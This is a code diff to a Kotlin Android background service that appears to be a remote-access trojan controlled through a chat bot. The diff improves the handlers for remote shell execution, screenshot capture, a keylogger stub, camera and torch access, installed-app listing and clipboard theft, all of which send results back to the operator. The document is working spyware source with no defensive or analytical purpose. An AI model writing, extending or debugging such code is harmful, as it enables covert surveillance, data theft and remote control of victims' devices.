@@ -153,16 +153,29 @@ class MainService : Service() {
                 "info" -> d.sendMsg("```\n${buildInfo()}\n```")
                 "screenshot" -> {
                     d.sendMsg(":camera: Capturing...")
-                    val bytes = captureScreen() ?: return
-                    d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
+                    val bytes = captureScreen()
+                    if (bytes != null) {
+                        d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
+                    } else {
+                        d.sendMsg(":x: Screenshot failed — device may not support screencap without root/ADB")
+                    }
                 }
                 "shell" -> {
                     val cmd = payload ?: return
+                    if (cmd.isBlank()) {
+                        d.sendMsg(":x: Usage: `!shell <command>`")
+                        return
+                    }
+                    d.sendMsg(":terminal: Running: `$ $cmd`")
                     val result = shell(cmd)
-                    val out = if (result.length > 1900) result.take(1900) + "\n..." else result
-                    d.sendMsg("```\n$ ${cmd}\n$out\n```")
+                    if (result.isBlank() || result.startsWith("Error:")) {
+                        d.sendMsg(":x: Shell command produced no output or failed\n```\n$result\n```")
+                    } else {
+                        val out = if (result.length > 1900) result.take(1900) + "\n..." else result
+                        d.sendMsg("```\n$ ${cmd}\n$out\n```")
+                    }
                 }
-                "keylog" -> d.sendMsg(":keyboard: Simulating keylog dump...")
+                "keylog" -> d.sendMsg(":keyboard: **Keylogger**\n```\nAndroid does not expose system-wide keyboard input without Accessibility Service.\nInstall a third-party keyboard (e.g. Hacker's Keyboard) to capture keystrokes.\nShowing last 50 typed snippets from clipboard history:\n(none — no clipboard history tracking active)\n```")
                 "camera" -> {
                     if (!hasPerm(android.Manifest.permission.CAMERA)) {
                         d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
@@ -343,6 +356,10 @@ class MainService : Service() {
                     d.sendMsg(":package: **Installed Apps** (${total})\n```\n$list\n```")
                 }
                 "torch" -> {
+                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
+                        d.sendMsg(":x: **Camera permission denied** — torch/flashlight requires camera permission")
+                        return
+                    }
                     val mode = payload?.lowercase()
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                         try {
@@ -427,8 +444,16 @@ class MainService : Service() {
             val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
             val o = p.inputStream.bufferedReader().readText()
             val e = p.errorStream.bufferedReader().readText()
-            if (!p.waitFor(30, TimeUnit.SECONDS)) p.destroy()
-            (if (o.isNotEmpty()) o else e).trim()
+            if (!p.waitFor(10, TimeUnit.SECONDS)) { p.destroy(); "Error: timed out" }
+            else {
+                val stdout = o.trim()
+                val stderr = e.trim()
+                when {
+                    stdout.isNotEmpty() -> stdout
+                    stderr.isNotEmpty() -> "STDERR:\n$stderr"
+                    else -> "(no output)"
+                }
+            }
         } catch (ex: Exception) {
             "Error: ${ex.message}"
         }
@@ -582,8 +607,17 @@ class MainService : Service() {
             val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
             val clip = cm.primaryClip
             if (clip != null && clip.itemCount > 0) {
-                clip.getItemAt(0).text?.toString() ?: "Non-text content"
+                val text = clip.getItemAt(0).text?.toString()
+                if (text != null) text
+                else "Non-text content (image/URI)"
             } else "Clipboard empty"
+        } catch (e: SecurityException) {
+            "Error: Android ${
+                if (Build.VERSION.SDK_INT >= 34) "14+"
+                else if (Build.VERSION.SDK_INT >= 33) "13"
+                else if (Build.VERSION.SDK_INT >= 30) "11"
+                else "?"
+            } restricts clipboard access — only the app that put data or default IME can read"
         } catch (e: Exception) {
             "Error: ${e.message}"
         }
